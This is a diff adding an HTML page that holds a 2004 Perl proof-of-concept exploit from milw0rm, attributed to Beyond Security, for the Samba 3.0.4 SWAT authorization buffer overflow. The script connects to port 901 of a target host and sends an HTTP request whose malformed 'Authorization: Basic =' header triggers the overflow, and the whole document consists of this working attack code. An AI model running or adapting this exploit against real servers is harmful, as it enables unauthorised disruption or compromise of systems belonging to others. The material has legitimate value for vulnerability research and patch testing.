@@ -1,0 +1,54 @@
+<html>
+<head>
+<title>Samba <= 3.0.4 SWAT Authorization Buffer Overflow Exploit</title>
+<pre>
+#!/usr/bin/perl
+# Samba 3.0.4 and prior's SWAT Authorization Buffer Overflow
+# Created by Noam Rathaus of Beyond Security Ltd.
+#
+
+use IO::Socket;
+use strict;
+
+my $host = $ARGV[0];
+
+my $remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host, 
+PeerPort =&gt; &quot;901&quot; );
+
+unless ($remote) { die &quot;cannot connect to http daemon on $host&quot; }
+
+print &quot;connected\n&quot;;
+
+$remote-&gt;autoflush(1);
+
+my $http = &quot;GET / HTTP/1.1\r
+Host: $host:901\r
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040712 
+Firefox/0.9.1\r
+Accept: text/xml\r
+Accept-Language: en-us,en;q=0.5\r
+Accept-Encoding: gzip,deflate\r
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
+Keep-Alive: 300\r
+Connection: keep-alive\r
+Authorization: Basic =\r
+\r
+&quot;;
+
+print &quot;HTTP: [$http]\n&quot;;
+print $remote $http;
+sleep(1);
+print &quot;Sent\n&quot;;
+
+while (&amp;lt;$remote&gt;)
+{
+&amp;nbsp;print $_;
+}
+print &quot;\n&quot;;
+
+close $remote;
+
+# milw0rm.com [2004-07-22]
+</pre>
+</html>
+
